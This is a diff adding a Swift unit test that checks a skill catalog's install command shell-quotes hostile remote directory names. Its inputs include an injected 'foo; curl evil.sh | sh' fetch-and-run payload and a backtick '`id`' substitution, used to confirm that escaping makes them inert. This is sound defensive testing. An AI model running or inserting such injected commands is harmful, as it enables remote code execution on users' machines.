@@ -51,6 +51,38 @@ final class CatalogRegistryTests: XCTestCase {
         XCTAssertEqual(skill.installCommand, "npx skills add anthropics/skills --skill pdf")
     }
 
+    /// A remote-controlled skill directory name must not be able to inject
+    /// shell content into the command the user pastes into a terminal:
+    /// non-plain-token names are POSIX single-quote escaped.
+    func testInstallCommandQuotesHostileRemoteNames() {
+        func command(name: String) -> String {
+            CatalogSkill(
+                id: "evil/repo:\(name)/SKILL.md",
+                sourceID: "evil/repo",
+                name: name,
+                skillPath: "\(name)/SKILL.md",
+                githubURL: URL(string: "https://github.com/evil/repo")!,
+                rawURL: URL(string: "https://raw.githubusercontent.com/evil/repo/main/\(name)/SKILL.md")!
+            ).installCommand
+        }
+
+        XCTAssertEqual(command(name: "pdf"), "npx skills add evil/repo --skill pdf")
+
+        // The audit scenario: a directory named `foo; curl evil.sh | sh`.
+        let injected = command(name: "foo; curl evil.sh | sh")
+        XCTAssertEqual(
+            injected,
+            "npx skills add evil/repo --skill 'foo; curl evil.sh | sh'",
+            "shell metacharacters must be quoted, not interpolated"
+        )
+
+        // An embedded single quote survives POSIX quoting rules.
+        XCTAssertEqual(command(name: "it's"), "npx skills add evil/repo --skill 'it'\\''s'")
+
+        // A backtick substitution attempt is inert text once quoted.
+        XCTAssertEqual(command(name: "`id`"), "npx skills add evil/repo --skill '`id`'")
+    }
+
     // MARK: Imported sources
 
     func testParsingAcceptsRepoURLOrBranchForms() {
